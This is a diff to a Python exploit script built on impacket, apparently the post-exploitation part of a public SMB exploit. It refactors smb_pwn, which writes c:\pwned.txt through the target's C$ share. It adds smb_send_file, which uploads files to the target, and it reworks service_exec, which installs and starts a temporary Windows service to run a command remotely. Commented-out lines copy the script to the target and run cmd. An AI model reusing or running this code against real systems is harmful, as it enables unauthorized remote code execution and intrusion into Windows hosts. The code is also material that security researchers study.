@@ -458,7 +458,7 @@ def exploit(target, pipe_name):
 	return True
 
 def smb_pwn(conn):
-	smbConn = smbconnection.SMBConnection(conn.get_remote_host(), conn.get_remote_host(), existingConnection=conn, manualNegotiate=True)
+	smbConn = conn.get_smbconnection()
 	
 	print('creating file c:\\pwned.txt on the target')
 	tid2 = smbConn.connectTree('C$')
@@ -466,10 +466,15 @@ def smb_pwn(conn):
 	smbConn.closeFile(tid2, fid2)
 	smbConn.disconnectTree(tid2)
 	
-	#service_exec(smbConn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt')
+	#smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
+	#service_exec(conn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt')
+
+def smb_send_file(smbConn, localSrc, remoteDrive, remotePath):
+	with open(localSrc, 'rb') as fp:
+		smbConn.putFile(remoteDrive + '$', remotePath, fp.read)
 
 # based on impacket/examples/serviceinstall.py
-def service_exec(smbConn, cmd):
+def service_exec(conn, cmd):
 	import random
 	import string
 	from impacket.dcerpc.v5 import transport, srvs, scmr
@@ -477,13 +482,12 @@ def service_exec(smbConn, cmd):
 	service_name = ''.join([random.choice(string.letters) for i in range(4)])
 
 	# Setup up a DCE SMBTransport with the connection already in place
-	rpctransport = transport.SMBTransport(smbConn.getRemoteHost(), smbConn.getRemoteHost(), filename=r'\svcctl', smb_connection=smbConn)
-	rpcsvc = rpctransport.get_dce_rpc()
+	rpcsvc = conn.get_dce_rpc('svcctl')
 	rpcsvc.connect()
 	rpcsvc.bind(scmr.MSRPC_UUID_SCMR)
 	svnHandle = None
 	try:
-		print("Opening SVCManager on %s....." % smbConn.getRemoteHost())
+		print("Opening SVCManager on %s....." % conn.get_remote_host())
 		resp = scmr.hROpenSCManagerW(rpcsvc)
 		svcHandle = resp['lpScHandle']
 		
@@ -518,7 +522,7 @@ def service_exec(smbConn, cmd):
 			scmr.hRDeleteService(rpcsvc, serviceHandle)
 			scmr.hRCloseServiceHandle(rpcsvc, serviceHandle)
 	except Exception, e:
-		print("ServiceExec Error on: %s" % smbConn.getRemoteHost())
+		print("ServiceExec Error on: %s" % conn.get_remote_host())
 		print(str(e))
 	finally:
 		if svcHandle:
